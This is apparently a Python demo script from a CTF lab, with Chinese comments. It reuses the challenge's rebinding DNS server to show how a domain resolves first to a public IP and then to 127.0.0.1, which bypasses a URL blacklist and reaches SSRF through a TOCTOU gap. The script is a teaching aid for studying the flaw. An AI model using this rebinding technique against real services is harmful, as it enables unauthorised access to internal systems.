# -*- coding: utf-8 -*-
"""DNS Rebinding 机理演示（复用题目自带 dns/rebind_dns.py 的真实代码）

原脚本监听 127.0.0.1:53（需要管理员权限），本演示改用 127.0.0.1:5353，
直接 import 题目源码里的 parse_question / handle_query，逻辑零改动。

演示内容：
  第 1 次查询  xxx.cache.rebind.huanyutech.cn  -> 公网 IP（骗过导入校验）
  10 秒内第 2 次查询同一域名                    -> 127.0.0.1（实际抓取打向本机）
  等待 11 秒后第 3 次查询                       -> 又回到公网 IP（窗口过期）

这正是 import_service.php 第 148 行注释所说的缺陷：
  "DNS is resolved during validation time only."
校验时解析一次（公网 IP），file_get_contents 抓取时再解析一次（127.0.0.1），
两次解析结果不同 => TOCTOU / DNS Rebinding 绕过黑名单。

用法：python lab/rebind_demo.py
"""
import os
import socket
import struct
import sys
import threading
import time

# 把题目自带的 dns/ 目录加入搜索路径，直接复用其代码
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'dns'))
import rebind_dns  # noqa: E402

LISTEN = ('127.0.0.1', 5353)
HOST = 'evil.cache.rebind.huanyutech.cn'


def serve(stop_event):
    srv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(LISTEN)
    srv.settimeout(0.5)
    print('[DNS] rebind 服务器已启动（复用题目源码），监听 %s:%d' % LISTEN)
    while not stop_event.is_set():
        try:
            packet, client = srv.recvfrom(512)
        except socket.timeout:
            continue
        try:
            srv.sendto(rebind_dns.handle_query(packet), client)
        except Exception:
            pass
    srv.close()


def build_query(hostname, qtype=1, tid=0x1234):
    flags = 0x0100  # RD
    header = struct.pack('!HHHHHH', tid, flags, 1, 0, 0, 0)
    qname = b''.join(bytes([len(p)]) + p.encode() for p in hostname.split('.')) + b'\x00'
    return header + qname + struct.pack('!HH', qtype, 1)


def query(hostname):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3)
    sock.sendto(build_query(hostname), LISTEN)
    data, _ = sock.recvfrom(512)
    sock.close()
    ancount = struct.unpack('!H', data[6:8])[0]
    if ancount == 0:
        return '(无 A 记录)'
    # 答案在报文末尾：name(2) type(2) class(2) ttl(4) rdlen(2) rdata(4)
    return socket.inet_ntoa(data[-4:])


def main():
    stop_event = threading.Event()
    t = threading.Thread(target=serve, args=(stop_event,), daemon=True)
    t.start()
    time.sleep(0.3)

    print('\n查询域名: %s\n' % HOST)
    print('第 1 次查询（模拟“导入校验”时刻）...')
    r1 = query(HOST)
    print('   -> %s   ✅ 校验通过：这是公网 IP，不在黑名单内' % r1)

    print('\n10 秒内第 2 次查询（模拟 file_get_contents “抓取”时刻）...')
    r2 = query(HOST)
    print('   -> %s   💀 抓取打向本机：SSRF 达成' % r2)

    print('\n等待 11 秒让时间窗过期...')
    time.sleep(11)
    r3 = query(HOST)
    print('第 3 次查询 -> %s   （窗口过期，重新返回公网 IP）' % r3)

    print('\n要点：validate_import_url() 校验时看到的 IP，')
    print('      和 fetch_remote_document() 真正连接时的 IP 不是同一个，')
    print('      黑名单校验因此失效 —— 这就是 TOCTOU / DNS Rebinding。')

    stop_event.set()
    t.join()


if __name__ == '__main__':
    main()
